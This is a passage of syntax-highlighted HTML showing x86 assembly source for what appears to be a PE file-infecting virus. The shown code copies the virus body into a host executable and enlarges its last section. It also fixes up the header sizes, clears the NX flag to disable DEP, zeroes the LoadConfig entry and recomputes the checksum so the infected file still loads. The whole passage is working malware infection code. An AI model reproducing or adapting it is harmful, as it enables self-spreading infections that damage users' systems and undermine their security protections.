                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptrVirusBuffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.dwVirusSize</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
                
                </span><span class="sc1">; enlarge last section</span><span class="sc0">
                </span><span class="sc1">; align VIRUS_SIZE to section alignment</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.dwVirusSize</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptr_opt_header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; section alignment</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AlignVal</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">56</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">   </span><span class="sc1">; optional header -&gt; imageSize</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">; section header  -&gt; virtual size</span><span class="sc0">
                
                </span><span class="sc1">; align raw_size to file alignment</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.dwVirusSize</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; section header  -&gt; sizeof raw data</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; file alignment</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AlignVal</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.dwVirusSize</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; sizeof init data</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                    
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptr_opt_header</span><span class="sc0">
                
                </span><span class="sc1">; unset DllCharacteristics NxCompatible flag to disable DEP </span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">70</span><span class="sc4">],</span><span class="sc2">0FEFFh</span><span class="sc0">
                
                </span><span class="sc1">; zero LoadConfig table Data directory entry in optional header </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">176</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">180</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                    
                </span><span class="sc1">;cmp dword ptr [ebx + 64],0 ; does pe header contain checksum </span><span class="sc0">
                </span><span class="sc1">;jz @f ; no checksum</span><span class="sc0">
                    
                </span><span class="sc1">; update checksum</span><span class="sc0">
            
                </span><span class="sc1">; count the size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptrMappedImage</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_last_sec</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Pointer to raw data </span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; sizeof raw data</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Checksum_File</span><span class="sc0">  
                    
                </span><span class="sc1">;save checksum </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> 
</span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">infect_3_fail</span><span class="sc4">:</span><span class="sc0">              
</span><span class="sc5">infect_3_end</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.ptrVirusBuffer</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc10">@f</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">VIRUS_MEM_ALLOC_SIZE</span><span class="sc0"> 
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FreeMem</span><span class="sc0">
</span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 
                </span><span class="sc5">retn</span></div></body>
</html>
